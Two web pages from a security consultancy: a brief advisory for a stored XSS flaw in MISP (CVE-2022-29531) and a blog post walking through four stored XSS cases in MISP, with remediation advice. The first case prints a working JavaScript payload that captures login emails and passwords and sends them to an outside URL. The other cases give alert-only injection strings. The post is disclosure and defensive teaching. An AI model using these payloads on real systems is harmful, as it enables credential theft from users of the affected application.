=== Content from zigrin.com_fece26d2_20250114_193252.html ===


* contact@zigrin.com

We are reliable, trustworthy, and ready for challenges! [Hire Us](/contact)

[Linkedin-in](https://www.linkedin.com/company/zigrin-security/)

[Github](https://github.com/Zigrin-Security)

[![Web Application Security Testing](https://zigrin.com/wp-content/uploads/2021/11/logo.png)](https://zigrin.com/)

* Company
  + [About Us](https://zigrin.com/about-us/)
  + [Why Should You Trust Us](https://zigrin.com/why-should-you-trust-us/)
  + [Frequently Asked Questions](https://zigrin.com/faq/)
* [Services](https://zigrin.com/services/)
  + [Web Application Security Testing](https://zigrin.com/services/web-application-security-testing/)
  + [Cybersecurity research](https://zigrin.com/services/cybersecurity-research/)
  + [Network Penetration Testing](https://zigrin.com/services/network-penetration-testing/)
  + [Vulnerability assessment](https://zigrin.com/services/vulnerability-assessment/)
  + [Red Teaming](https://zigrin.com/services/red-teaming/)
  + [Mobile Application Penetration Testing](https://zigrin.com/services/mobile-penetration-testing/)
  + [Source Code Review](https://zigrin.com/services/source-code-review/)
* [Case study](https://zigrin.com/casestudy/)
  + [Critical vulnerability discovered in MISP](https://zigrin.com/case-study/vulnerability-discovery-in-misp/)
  + [Securing company’s main website](https://zigrin.com/case-study/securing-companys-main-website/)
  + [SaaS Penetration Testing Resulting in Closing the Deal](https://zigrin.com/case-study/saas-penetration-testing-resulting-in-closing-the-deal/)
  + [Special delivery for request](https://zigrin.com/case-study/special-delivery-for-request/)
* [Advisories](https://zigrin.com/advisories/)
* [Blog](https://zigrin.com/blog/)
* [Tools](https://zigrin.com/tools/)
  + [Cake Fuzzer](https://zigrin.com/tools/cake-fuzzer/)
  + [HTTP2WebSocket](https://zigrin.com/tools/http2websocket/)
* [Talks](https://zigrin.com/talks/)
* [Contact](https://zigrin.com/contact/)

Search for:

### [Have Any Questions?](https://zigrin.com/contact/)

Contact our expert

[![Web Application Security Testing](https://zigrin.com/wp-content/uploads/2021/11/logo.png)](https://zigrin.com/)

Search for:

* Company
  + [About Us](https://zigrin.com/about-us/)
  + [Why Should You Trust Us](https://zigrin.com/why-should-you-trust-us/)
  + [Frequently Asked Questions](https://zigrin.com/faq/)
* [Services](https://zigrin.com/services/)
  + [Web Application Security Testing](https://zigrin.com/services/web-application-security-testing/)
  + [Cybersecurity research](https://zigrin.com/services/cybersecurity-research/)
  + [Network Penetration Testing](https://zigrin.com/services/network-penetration-testing/)
  + [Vulnerability assessment](https://zigrin.com/services/vulnerability-assessment/)
  + [Red Teaming](https://zigrin.com/services/red-teaming/)
  + [Mobile Application Penetration Testing](https://zigrin.com/services/mobile-penetration-testing/)
  + [Source Code Review](https://zigrin.com/services/source-code-review/)
* [Case study](https://zigrin.com/casestudy/)
  + [Critical vulnerability discovered in MISP](https://zigrin.com/case-study/vulnerability-discovery-in-misp/)
  + [Securing company’s main website](https://zigrin.com/case-study/securing-companys-main-website/)
  + [SaaS Penetration Testing Resulting in Closing the Deal](https://zigrin.com/case-study/saas-penetration-testing-resulting-in-closing-the-deal/)
  + [Special delivery for request](https://zigrin.com/case-study/special-delivery-for-request/)
* [Advisories](https://zigrin.com/advisories/)
* [Blog](https://zigrin.com/blog/)
* [Tools](https://zigrin.com/tools/)
  + [Cake Fuzzer](https://zigrin.com/tools/cake-fuzzer/)
  + [HTTP2WebSocket](https://zigrin.com/tools/http2websocket/)
* [Talks](https://zigrin.com/talks/)
* [Contact](https://zigrin.com/contact/)

[![Web Application Security Testing](https://engitech.s3.amazonaws.com/images/logo.svg)](https://zigrin.com/)

Over 10 years we help companies reach their financial and branding goals. Engitech is a values-driven technology agency dedicated.

#### Gallery

#### Contacts

411 University St, Seattle, USA

engitech@oceanthemes.net

+1 -800-456-478-23

Twitter

Facebook-f

Pinterest-p

Instagram

# MISP – Stored XSS in the event graph

* [Home](https://zigrin.com)
* [Advisories](https://zigrin.com/advisories/)
* MISP – Stored XSS in the event graph

DATE

20.04.2022

Affected Vendor

CIRCL – Computer Incident Response Center Luxembourg

Affected Product

MISP – Open Source Threat Intelligence Platform & Open Standards For Threat Information Sharing – <https://www.misp-project.org/>

Vulnerable version

2.4.157

Fixed version

2.4.158

CVSS

5.4 Medium [CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)

Recommendations

Update to MISP version 2.4.158

Vulnerability details

An issue was discovered in MISP before 2.4.158. There is stored XSS in the event graph via a tag name.

CVE

CVE-2022-29531

Credits

Dawid Czarnecki

References

* [https://github.com/MISP/MISP/compare/v2.4.157…v2.4.158](https://github.com/MISP/MISP/compare/v2.4.157...v2.4.158)
* <https://github.com/MISP/MISP/commit/bb3b7a7e91862742cae228c43b309>
* <https://nvd.nist.gov/vuln/detail/CVE-2022-29531>

Do you think the security of your data might be lacking? Let's find the best approach together.
 Once you contact us, we will ask you about the project you want to secure.

## NEED A CONSULTATION?

[Contact Us](https://zigrin.com/contact/)

![](https://zigrin.com/wp-content/uploads/2022/01/logo-zigrin-security-biale-300x135.png)

### contact@zigrin.com

Our mailbox

### [GPG Key](https://zigrin.com/wp-content/uploads/2022/01/gpg.txt)

Contact us securely

* [Home](https://zigrin.com/)
* [Services](https://zigrin.com/services/)
* [Case study](https://zigrin.com/casestudy/)
* [Advisories](https://zigrin.com/advisories/)
* [Career](https://zigrin.com/career/)
* [Security Policy](https://zigrin.com/security-policy/)
* [Privacy Policy](https://zigrin.com/privacy-policy/)
* [Contact](https://zigrin.com/contact/)

Copyright © 2021 Zigrin Security. All Rights Reserved.

[Linkedin-in](https://www.linkedin.com/company/zigrin-security/)

[Github](https://github.com/Zigrin-Security)

We use cookies on our website to give you the most relevant experience by remembering your preferences and repeat visits. By clicking “Accept All”, you consent to the use of ALL the cookies. However, you may visit "Cookie Settings" to provide a controlled consent. Here you can find our [privacy policy](/privacy-policy/) Cookie SettingsAccept AllManage consent

Close

#### Privacy Overview

This website uses cookies to improve your experience while you navigate through the website. Out of these, the cookies that are categorized as necessary are stored on your browser as they are essential for the working of basic functionalities of the website. We also use third-party cookies that help us analyze and understand how you use this website. These cookies will be stored in your browser only with your consent. You also have the option to opt-out of these cookies. But opting out of some of these cookies may affect your browsing experience.

Necessary

Necessary

Always Enabled

Necessary cookies are absolutely essential for the website to function properly. These cookies ensure basic functionalities and security features of the website, anonymously.

| Cookie | Duration | Description |
| --- | --- | --- |
| cookielawinfo-checkbox-analytics | 11 months | This cookie is set by GDPR Cookie Consent plugin. The cookie is used to store the user consent for the cookies in the category "Analytics". |
| cookielawinfo-checkbox-functional | 11 months | The cookie is set by GDPR cookie consent to record the user consent for the cookies in the category "Functional". |
| cookielawinfo-checkbox-necessary | 11 months | This cookie is set by GDPR Cookie Consent plugin. The cookies is used to store the user consent for the cookies in the category "Necessary". |
| cookielawinfo-checkbox-others | 11 months | This cookie is set by GDPR Cookie Consent plugin. The cookie is used to store the user consent for the cookies in the category "Other. |
| cookielawinfo-checkbox-performance | 11 months | This cookie is set by GDPR Cookie Consent plugin. The cookie is used to store the user consent for the cookies in the category "Performance". |
| viewed\_cookie\_policy | 11 months | The cookie is set by the GDPR Cookie Consent plugin and is used to store whether or not user has consented to the use of cookies. It does not store any personal data. |

Functional

Functional

Functional cookies help to perform certain functionalities like sharing the content of the website on social media platforms, collect feedbacks, and other third-party features.

Performance

Performance

Performance cookies are used to understand and analyze the key performance indexes of the website which helps in delivering a better user experience for the visitors.

Analytics

Analytics

Analytical cookies are used to understand how visitors interact with the website. These cookies help provide information on metrics the number of visitors, bounce rate, traffic source, etc.

Advertisement

Advertisement

Advertisement cookies are used to provide visitors with relevant ads and marketing campaigns. These cookies track visitors across websites and collect information to provide customized ads.

Others

Others

Other uncategorized cookies are those that are being analyzed and have not been classified into a category as yet.

SAVE & ACCEPT



=== Content from zigrin.com_9ff29e94_20250114_193254.html ===


* contact@zigrin.com

We are reliable, trustworthy, and ready for challenges! [Hire Us](/contact)

[Linkedin-in](https://www.linkedin.com/company/zigrin-security/)

[Github](https://github.com/Zigrin-Security)

[![Web Application Security Testing](https://zigrin.com/wp-content/uploads/2021/11/logo.png)](https://zigrin.com/)

* Company
  + [About Us](https://zigrin.com/about-us/)
  + [Why Should You Trust Us](https://zigrin.com/why-should-you-trust-us/)
  + [Frequently Asked Questions](https://zigrin.com/faq/)
* [Services](https://zigrin.com/services/)
  + [Web Application Security Testing](https://zigrin.com/services/web-application-security-testing/)
  + [Cybersecurity research](https://zigrin.com/services/cybersecurity-research/)
  + [Network Penetration Testing](https://zigrin.com/services/network-penetration-testing/)
  + [Vulnerability assessment](https://zigrin.com/services/vulnerability-assessment/)
  + [Red Teaming](https://zigrin.com/services/red-teaming/)
  + [Mobile Application Penetration Testing](https://zigrin.com/services/mobile-penetration-testing/)
  + [Source Code Review](https://zigrin.com/services/source-code-review/)
* [Case study](https://zigrin.com/casestudy/)
  + [Critical vulnerability discovered in MISP](https://zigrin.com/case-study/vulnerability-discovery-in-misp/)
  + [Securing company’s main website](https://zigrin.com/case-study/securing-companys-main-website/)
  + [SaaS Penetration Testing Resulting in Closing the Deal](https://zigrin.com/case-study/saas-penetration-testing-resulting-in-closing-the-deal/)
  + [Special delivery for request](https://zigrin.com/case-study/special-delivery-for-request/)
* [Advisories](https://zigrin.com/advisories/)
* [Blog](https://zigrin.com/blog/)
* [Tools](https://zigrin.com/tools/)
  + [Cake Fuzzer](https://zigrin.com/tools/cake-fuzzer/)
  + [HTTP2WebSocket](https://zigrin.com/tools/http2websocket/)
* [Talks](https://zigrin.com/talks/)
* [Contact](https://zigrin.com/contact/)

Search for:

### [Have Any Questions?](https://zigrin.com/contact/)

Contact our expert

[![Web Application Security Testing](https://zigrin.com/wp-content/uploads/2021/11/logo.png)](https://zigrin.com/)

Search for:

* Company
  + [About Us](https://zigrin.com/about-us/)
  + [Why Should You Trust Us](https://zigrin.com/why-should-you-trust-us/)
  + [Frequently Asked Questions](https://zigrin.com/faq/)
* [Services](https://zigrin.com/services/)
  + [Web Application Security Testing](https://zigrin.com/services/web-application-security-testing/)
  + [Cybersecurity research](https://zigrin.com/services/cybersecurity-research/)
  + [Network Penetration Testing](https://zigrin.com/services/network-penetration-testing/)
  + [Vulnerability assessment](https://zigrin.com/services/vulnerability-assessment/)
  + [Red Teaming](https://zigrin.com/services/red-teaming/)
  + [Mobile Application Penetration Testing](https://zigrin.com/services/mobile-penetration-testing/)
  + [Source Code Review](https://zigrin.com/services/source-code-review/)
* [Case study](https://zigrin.com/casestudy/)
  + [Critical vulnerability discovered in MISP](https://zigrin.com/case-study/vulnerability-discovery-in-misp/)
  + [Securing company’s main website](https://zigrin.com/case-study/securing-companys-main-website/)
  + [SaaS Penetration Testing Resulting in Closing the Deal](https://zigrin.com/case-study/saas-penetration-testing-resulting-in-closing-the-deal/)
  + [Special delivery for request](https://zigrin.com/case-study/special-delivery-for-request/)
* [Advisories](https://zigrin.com/advisories/)
* [Blog](https://zigrin.com/blog/)
* [Tools](https://zigrin.com/tools/)
  + [Cake Fuzzer](https://zigrin.com/tools/cake-fuzzer/)
  + [HTTP2WebSocket](https://zigrin.com/tools/http2websocket/)
* [Talks](https://zigrin.com/talks/)
* [Contact](https://zigrin.com/contact/)

[![Web Application Security Testing](https://engitech.s3.amazonaws.com/images/logo.svg)](https://zigrin.com/)

Over 10 years we help companies reach their financial and branding goals. Engitech is a values-driven technology agency dedicated.

#### Gallery

#### Contacts

411 University St, Seattle, USA

engitech@oceanthemes.net

+1 -800-456-478-23

Twitter

Facebook-f

Pinterest-p

Instagram

# Zigrin Blog

* [Home](https://zigrin.com)
* [Blog](https://zigrin.com/blog/)
* [Web Application Security Testing](https://zigrin.com/category/web-application-security-testing/)
* CakePHP Application Cybersecurity Research – Protect Your Website from Stored XSS Attacks: Understanding and Preventing Vulnerabilities in Open-source Applications

[Web Application Security Testing](https://zigrin.com/category/web-application-security-testing/) ![xss protection](https://zigrin.com/wp-content/uploads/2023/04/xss-protection.jpg)
\_ [June 7, 2023](https://zigrin.com/cakephp-application-cybersecurity-research-protect-your-website-from-stored-xss-attacks-understanding-and-preventing-vulnerabilities-in-open-source-applications/)\_ [Ulaş Deniz İlhan](https://zigrin.com/author/deniz/)\_ [0 Comments](https://zigrin.com/cakephp-application-cybersecurity-research-protect-your-website-from-stored-xss-attacks-understanding-and-preventing-vulnerabilities-in-open-source-applications/#respond)
# CakePHP Application Cybersecurity Research – Protect Your Website from Stored XSS Attacks: Understanding and Preventing Vulnerabilities in Open-source Applications

Stored Cross-Site Scripting (XSS) are relatively common and dangerous vulnerabilities that can compromise your web application’s security. In this article, we will discuss what stored XSS attacks are, their impact on website security, and stored XSS protection in web applications with examples of stored XSS vulnerability we found in MISP.

!**This** **is the **seventh of nine articles in the “CakePHP Application Cybersecurity Research” series**.** **Here you can find the previous ones dedicated to this topic:**

* **[Be Careful with Reflections For Your Web Application Security](https://zigrin.com/cakephp-application-cybersecurity-research-be-careful-with-reflections-for-your-web-application-security/)**
* **[Exploring the PHAR Deserialization PHP Vulnerability: A White Box Testing Example](https://zigrin.com/cakephp-application-cybersecurity-research-exploring-the-phar-deserialization-php-vulnerability-a-white-box-testing-example/)**
* **[The Impact of a PHP Vulnerability: Exploring the Password Confirmation Bypass in MISP](https://zigrin.com/cakephp-application-cybersecurity-research-the-impact-of-a-php-vulnerability-exploring-the-password-confirmation-bypass-in-misp/)**
* **[Hiding in Plain Sight: The Hidden Danger of SQL Injection in Input Field Names](https://zigrin.com/cakephp-application-cybersecurity-research-hiding-in-plain-sight-the-hidden-danger-of-sql-injection-in-input-field-names/)**
* **[Bypassing security mechanisms in CakePHP vulnerability scanning](https://zigrin.com/cakephp-application-cybersecurity-research-bypassing-security-mechanisms-in-cakephp-vulnerability-scanning/)**
* **[Attack surface in CakePHP web application penetration testing](https://zigrin.com/cakephp-application-cybersecurity-research-attack-surface-in-cakephp-web-application-penetration-testing/)**
* **[White box penetration testing in action](https://zigrin.com/cakephp-application-cybersecurity-research-white-box-penetration-testing-in-action/)**

**In this article you will find:**

* [Introduction to Stored XSS Attacks](#Introduction-to-Stored-XSS-Attacks:)
* [Briefly, what is MISP and what findings have we discovered?](#Briefly,-what-is-MISP-and-what-findings-have-we-discovered?)
* [Technical Explanation and Examples of Stored XSS Attacks in the MISP Application](#Technical-Explanation-and-Examples-of-Stored-XSS-Attacks-in-the-MISP-Application)
  + [Case 1 – LinOTP Plugin](#Case-1-–-LinOTP-Plugin)
  + [Case 2 – Galaxy clusters view](#Case-2-–-Galaxy-clusters-view)
  + [Case 3 – Event graph view](#Case-3-–-Event-graph-view)
  + [Case 4 – Cerebrates](#Case-4-–-Cerebrates)
* [Generic Impact of Stored XSS Attacks](#Generic-Impact-of-Stored-XSS-Attacks:)
* [Best Practices for XSS Protection](#Best-Practices-for-XSS-Protection:)
  + [Output validation and sanitization](#Output-validation-and-sanitization)
  + [Use HTTP Headers](#Use-HTTP-Headers)
  + [Use HttpOnly and Secure Cookie Flags](#Use-HttpOnly-and-Secure-Cookie-Flags)
  + [Remediations Summary](#Remediations-Summary)
* [Conclusion](#Conclusion:)

## Introduction to Stored XSS Attacks:

Cross-Site Scripting (XSS) attacks involve injecting malicious code into a website to steal data or modify content. Stored XSS attacks, also known as Persistent XSS attacks, occur when malicious code is injected into a web application and stored on the server for an extended period. The code can steal sensitive information, modify content, or redirect users to malicious websites.

## Briefly, what is MISP and what findings have we discovered?

MISP is an open-source intelligence-sharing platform that allows organizations to share and store data securely. However, even MISP has vulnerabilities, including stored XSS. Recently, Dawid found a stored XSS vulnerability in the MISP application, which could allow an attacker to execute malicious code in a user’s browser. The attacker could then steal users’ authentication credentials, edit, or modify information, or redirect the user to a malicious website.

## Technical Explanation and Examples of Stored XSS Attacks in the MISP Application

During the penetration testing, Dawid discovered that the application vulnerability was caused by insufficient output sanitization. The attacker could use the MISP API to inject malicious code into the application, which would then be stored in the database. We found that the vulnerability affected a couple of different places in the MISP applications and could be exploited using specially crafted input. Here is the list of affected components:

![stored XSS attacks list of affected components](https://zigrin.com/wp-content/uploads/2023/04/stored-XSS-attacks-list-of-affected-components.png)

To demonstrate the impact of this vulnerability, we take a look at each case.

### Case 1 – LinOTP Plugin

Okay, the first one is also the most impactful one. The LinOTP plugin contains a Stored XSS vulnerability allowing malicious administrators to inject a JavaScript payload inside the **LinOTPAuth.baseUrl** MISP setting. This payload will be later on executed by anyone viewing the MISP login page.

I am going to demonstrate the consequences with an example of a malicious administrator stealing victim users’ credentials when users authenticate to the application.

The following section allows injecting the malicious script:

Administration > Server Settings & Maintenance > Security Settings > LinOTPAuth.baseUrl

**Credentials theft scenario:**

To illustrate the vulnerability impact, we enabled the LinOTPAuth plugin and set the “LinOTPAuth.baseUrl” MISP setting to the following value:

```
https://127.0.0.1:9999/?q="></a><script>$(function(){$('#UserLoginForm ').submit(function(e){em=$("input#UserEmail").val();p=$("input#UserPas sword").val();alert("I'm stealing your email and password: "+em+": "+p);location.href='https://zigrin.com/misp-exfiltration?e='+em+'&p='+p;return false;});})</script><a href="
```

We changed those settings as a MISP administrator via the following link:

http://<MISP-SERVER>/servers/serverSettings/Security

When another user tries to log in, the following message appears:

![stealing users credentials via stored XSS](https://zigrin.com/wp-content/uploads/2023/04/stealing-users-credentials-via-stored-XSS.png)

Stealing users’ credentials via Stored XSS

Subsequently, the script redirects the user to the attacker’s-controlled website with his username and password in the URL. This password is saved in the logs of the attacker’s website:

![password saved in logs](https://zigrin.com/wp-content/uploads/2023/04/password-saved-in-logs-1024x35.png)

Do not forget that this is just an example scenario, a real attack could be conducted in a much stealthier way with no significant changes to the MISP behavior.

### Case 2 – Galaxy clusters view

In the second case our point of injection is a galaxy cluster. As you will see in this example, MISP users assigned to a specific role can create and edit created galaxy clusters. This is available under the following URL path: /galaxy\_clusters/view/1 .

By default, the following roles have assigned the “**perm\_galaxy\_editor**” permission, required to conduct these actions:

* Administrator
* Org admin
* Sync user

A malicious user assigned to one of the above roles can inject a JavaScript code into the “Source” field of a new or edited galaxy cluster. This code will be executed by other users who view the details of this galaxy cluster.

We conducted the following steps to demonstrate this vulnerability:

1. Visit the URL path: /galaxy\_clusters/view/1
2. Click the “Add Cluster” link
3. Specify a name, for example, “XSS Cluster”
4. Insert the following link in the source field and click “Submit”:

```
https://zigrin.com/source?a="><script>alert("Stored- XSS:"+document.domain)</script>
```

Do not forget that, the content has to be a valid URL without spaces. Immediately after pressing “Submit” the following alert box appears:

![stored XSS in galaxy cluster view](https://zigrin.com/wp-content/uploads/2023/04/stored-XSS-in-galaxy-cluster-view-1024x324.png)

Stored XSS in Galaxy Cluster view

Boom! An alert box, we all love to see one when testing XSSes. Now, this alert box will execute on the browsers of all users who will try to view this galaxy cluster via the following URL: http://misp.local/galaxy\_clusters/view/10349

In a real-life scenario, an attacker can instruct the administrator’s browser to create a new administrator user and gain full administrative access to the MISP platform. But the attacker would have to utilize techniques to include more JavaScript payload as the “Source” input field is truncated to 255 characters.

### Case 3 – Event graph view

MISP allows some users to create new tags that can be later on used in events and attributes.

By default, the following roles have assigned the “**perm\_tag\_editor**” permission, required to create new tags:

* Administrator
* Org admin
* Sync user

When a malicious user with such permission creates a tag with injected JavaScript code, it will be executed when viewing an event graph of any MISP event.

We conducted the following steps to demonstrate this vulnerability:

* Visit “Event Actions > Add Tag”
* Specify a tag’s color, for example: #ffffff
* Insert the following payload into the “Name” field and click “Submit”:

```
XSS'"><img src="aaa" onerror="alert`Storred XSS in event graph`" />
```

Subsequently, view any event created in the MISP instance from a victim’s perspective. Click on the event graph button:

![event graph button triggering the XSS](https://zigrin.com/wp-content/uploads/2023/04/event-graph-button-triggering-the-XSS.png)

Event graph button triggering the XSS

When clicked, the JavaScript code is executed and the alert box we have been waiting appears:

![stored XSS executed in event graph view](https://zigrin.com/wp-content/uploads/2023/04/stored-XSS-executed-in-event-graph-view.png)

Stored XSS executed in event graph view

### Case 4 – Cerebrates

In this example, you will hear the familiar name of another [CIRCL](https://www.circl.lu/) product, [Cerebrate](https://www.cerebrate-project.org/). But this vulnerability is not in Cerebrate. A Sync action for cerebrate in MISP allows entering a URL for a Cerebrate instance. This URL can contain the “javascript:” prefix followed by a JavaScript code. When an administrator injects a JavaScript code that way, this script will be executed when viewing the cerebrate information and clicking on the URL.

To illustrate the attack using this vulnerability we inserted the following payload into the Url field of a newly created Cerebrate instance:

```
javascript:alert(document.domain)
```

When any MISP administrator views this Cerebrate’s information and clicks on the URL the script executes:

![JavaScript alert executed](https://zigrin.com/wp-content/uploads/2023/04/JavaScript-alert-executed.png)

JavaScript alert executed

The attack likelihood is considered very low here due to the following:

* Payload can be injected only by MISP administrators
* Payload targets other MISP administrators only
* A victim administrator has to click on a suspiciously looking link for the successful attack

## Generic Impact of Stored XSS Attacks:

Stored XSS attacks can have significant impacts on website security. Attackers can use the vulnerability to steal sensitive data such as user credentials, credit card information, or other personal information. Additionally, attackers can modify website content, leading to damage to the website’s reputation. They can also redirect users to malicious websites, infecting their computers with malware or ransomware. You can find the specific impacts for stored XSS we found in MISP in the previous section.

## Best Practices for XSS Protection:

To remediate the stored cross-site scripting (stored XSS) vulnerabilities that are like what Dawid found in the open-source project MISP, there are several steps that can be taken to prevent similar attacks from occurring.

### Output validation and sanitization

One of the most important steps in preventing stored XSS attacks is to properly validate and [sanitize output](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) generated using the user provided data in the front end before presenting it to the user. There are many different output encoding methods because browsers parse HTML, JS, URLs, and CSS differently.

It’s important to note that user input can not only come from the HTTP request but also from the database in form of comments, posts, messages, etc.

### Use HTTP Headers

* X-XSS-Protection: This header is used by modern web browsers to enable or disable the built-in XSS filtering. It can be set to the value ‘**1; mode=block**’ to enable the filtering, or ‘**0**’ to disable it.
* X-Content-Type-Options: This header helps prevent certain types of XSS attacks by preventing the browser from interpreting files as a different MIME type than the one specified by the server. The value of this header should be set to nosniff.
* Content-Security-Policy (CSP): This header allows a web application to specify which sources of content are allowed to be loaded by the browser. It provides a way to enforce a whitelist of trusted sources and can help prevent XSS attacks by blocking untrusted sources. For example, a CSP header might look like this:

**Content-Security-Policy: default-src ‘self’; script-src ‘self’ https://trusted-domain.com; object-src ‘none’**

* Strict-Transport-Security (HSTS): This header helps prevent SSL-stripping attacks, which can be used to facilitate XSS attacks. By setting this header, a web application can specify that it should only be accessed over a secure, encrypted connection.

### Use HttpOnly and Secure Cookie Flags

Cookie flags are an important aspect of securing cookies from Cross-Site Scripting (XSS) attacks. Cookie flags are attributes that can be set on cookies when they are sent from the server to the client. They define the behavior of the cookie and can help prevent XSS attacks by limiting the scope of the cookie and making it more secure.

* The HttpOnly flag can be set on a cookie to prevent JavaScript from accessing its content.
* The Secure flag ensures that the cookie is only sent over encrypted connections (HTTPS), which helps to prevent eavesdropping and tampering by attackers.
* Another flag, SameSite, can be used to prevent the cookie from being sent with cross-site requests.

These flags help to make cookies more secure and can play an important role in preventing XSS attacks.

### Remediations Summary

It’s important to keep in mind that preventing stored XSS vulnerabilities requires a multi-layered approach, involving a combination of technical and procedural measures. By taking these steps, administrators and developers can help prevent stored XSS attacks and protect the application and its users from potential harm.

## Conclusion:

In conclusion, stored cross-site scripting (XSS) attacks pose a significant risk to the security of web applications. The vulnerabilities are caused by insufficient input sanitization, and the attacker can inject malicious code into the application, which is then stored in the database. In this article, we discussed stored XSS attacks, their impact on website security, and how to protect web applications from these attacks. We also used MISP, an open-source intelligence-sharing platform, as a case study to demonstrate the consequences of stored XSS attacks. By understanding the risks and implementing proper measures to prevent vulnerabilities, web developers and organizations can protect their websites from these attacks and ensure their users’ security.

!**This article is part of the series dedicated to the CakePHP application cybersecurity research. The next one will describe [the reflected XSS vulnerability](https://zigrin.com/cakephp-application-cybersecurity-research-be-careful-with-reflections-for-your-web-application-security/).**

![](https://zigrin.com/wp-content/uploads/2022/07/Tlo_poziome.png)

**Let’s talk about conducting cybersecurity research of your web application.**

### Book a chat with a cybersecurity expert

19+21=?

Submit

**Is this article helpful to you? Share it with your friends**.

* [Facebook](https://www.facebook.com/sharer.php?u=https://zigrin.com/cakephp-application-cybersecurity-research-protect-your-website-from-stored-xss-attacks-understanding-and-preventing-vulnerabilities-in-open-source-applications/)
* [LinkedIn](https://www.linkedin.com/sharing/share-offsite/?url=https://zigrin.com/cakephp-application-cybersecurity-research-protect-your-website-from-stored-xss-attacks-understanding-and-preventing-vulnerabilities-in-open-source-applications/)
* [Twitter](https://twitter.com/intent/tweet?url=https://zigrin.com/cakephp-application-cybersecurity-research-protect-your-website-from-stored-xss-attacks-understanding-and-preventing-vulnerabilities-in-open-source-applications/&text=CakePHP%20Application%20Cybersecurity%20Research%20-%20Protect%20Your%20Website%20from%20Stored%20XSS%20Attacks:%20Understanding%20and%20Preventing%20Vulnerabilities%20in%20Open-source%20Applications)

[Cake PHP security](https://zigrin.com/tag/cake-php-security/) [cybersecurity research](https://zigrin.com/tag/cybersecurity-research/)[♥73](https://zigrin.com/wp-admin/admin-ajax.php?action=process_simple_like&post_id=11290&nonce=0ee4b50760&is_comment=0&disabled=true "Like")
![](https://secure.gravatar.com/avatar/e5de921645a7b3fe2b264f5a2efc0794?s=250&d=mm&r=g)

Author

###### Ulaş Deniz İlhan

 [###### CakePHP Application Cybersecurity Research – Exploring the PHAR Deserialization PHP Vulnerability: A White Box Testing Example

May 17, 2023](https://zigrin.com/cakephp-application-cybersecurity-research-exploring-the-phar-deserialization-php-vulnerability-a-white-box-testing-example/)[###### CakePHP Application Cybersecurity Research – Be Careful with Reflections For Your Web Application Security

June 28, 2023](https://zigrin.com/cakephp-application-cybersecurity-research-be-careful-with-reflections-for-your-web-application-security/)

Search for:

![Dawid Czarnecki](https://zigrin.com/wp-content/uploads/2022/02/Dawid-Czarnecki-Zigrin-2.jpg)

##### Dawid Czarnecki

CEO of Zigrin Security and security researcher.

##### Categories

Categories
Select Category
Cybersecurity  (1)
Web Application Security Testing  (31)

##### Recent Posts

* [![what hackers do with your data](https://zigrin.com/wp-content/uploads/2023/10/what-hackers-do-with-your-data-150x150.png)](https://zigrin.com/what-do-cyber-threat-actors-do-with-your-information/)

  ###### [What do Cyber Threat Actors do with your information?](https://zigrin.com/what-do-cyber-threat-actors-do-with-your-information/)

  October 11, 2023
* [![AI penetration testing](https://zigrin.com/wp-content/uploads/2023/09/AI-penetration-testing-150x150.jpg)](https://zigrin.com/as-an-ai-language-model-please-have-mercy-on-me/)

  ###### [As an AI Language Model, Please Have Mercy on Me](https://zigrin.com/as-an-ai-language-model-please-have-mercy-on-me/)

  September 13, 2023
* [![types of penetration testing](https://zigrin.com/wp-content/uploads/2023/08/types-of-penetration-testing-150x150.jpg)](https://zigrin.com/black-box-vs-grey-box-vs-white-box-which-penetration-test-is-right-for-you/)

  ###### [Black-box vs. Grey-box vs. White-box: Which Penetration Test Is Right for You?](https://zigrin.com/black-box-vs-grey-box-vs-white-box-which-penetration-test-is-right-for-you/)

  August 9, 2023
##### Tags

[AI](https://zigrin.com/tag/ai/)
[backup security](https://zigrin.com/tag/backup-security/)
[Cake PHP security](https://zigrin.com/tag/cake-php-security/)
[centralized logging](https://zigrin.com/tag/centralized-logging/)
[cybersecurity](https://zigrin.com/tag/cybersecurity/)
[cybersecurity for startups](https://zigrin.com/tag/cybersecurity-for-startups/)
[cybersecurity research](https://zigrin.com/tag/cybersecurity-research/)
[data protection solutions](https://zigrin.com/tag/data-protection-solutions/)
[data security](https://zigrin.com/tag/data-security/)
[edge security](https://zigrin.com/tag/edge-security/)
[http security headers](https://zigrin.com/tag/http-security-headers/)
[password mangers](https://zigrin.com/tag/password-mangers/)
[penetration testing](https://zigrin.com/tag/penetration-testing/)
[pentest report](https://zigrin.com/tag/pentest-report/)
[secure containerization](https://zigrin.com/tag/secure-containerization/)
[secure software development](https://zigrin.com/tag/secure-software-development/)
[security patches](https://zigrin.com/tag/security-patches/)
[software development best practices](https://zigrin.com/tag/software-development-best-practices/)
[sse security](https://zigrin.com/tag/sse-security/)
[startup](https://zigrin.com/tag/startup/)
[tips](https://zigrin.com/tag/tips/)
[two-factor authentication](https://zigrin.com/tag/two-factor-authentication/)
[vulnerability patching](https://zigrin.com/tag/vulnerability-patching/)
[web application security](https://zigrin.com/tag/web-application-security/)
[white box](https://zigrin.com/tag/white-box/)
[XSS](https://zigrin.com/tag/xss/)
[![cybersecurity contact](https://zigrin.com/wp-content/uploads/2022/07/cybersecurity-contact-737x1024.png)](https://zigrin.com/contact/)

![](https://zigrin.com/wp-content/uploads/2022/01/logo-zigrin-security-biale-300x135.png)

### contact@zigrin.com

Our mailbox

### [GPG Key](https://zigrin.com/wp-content/uploads/2022/01/gpg.txt)

Contact us securely

* [Home](https://zigrin.com/)
* [Services](https://zigrin.com/services/)
* [Case study](https://zigrin.com/casestudy/)
* [Advisories](https://zigrin.com/advisories/)
* [Career](https://zigrin.com/career/)
* [Security Policy](https://zigrin.com/security-policy/)
* [Privacy Policy](https://zigrin.com/privacy-policy/)
* [Contact](https://zigrin.com/contact/)

Copyright © 2021 Zigrin Security. All Rights Reserved.

[Linkedin-in](https://www.linkedin.com/company/zigrin-security/)

[Github](https://github.com/Zigrin-Security)

We use cookies on our website to give you the most relevant experience by remembering your preferences and repeat visits. By clicking “Accept All”, you consent to the use of ALL the cookies. However, you may visit "Cookie Settings" to provide a controlled consent. Here you can find our [privacy policy](/privacy-policy/) Cookie SettingsAccept AllManage consent

Close

#### Privacy Overview

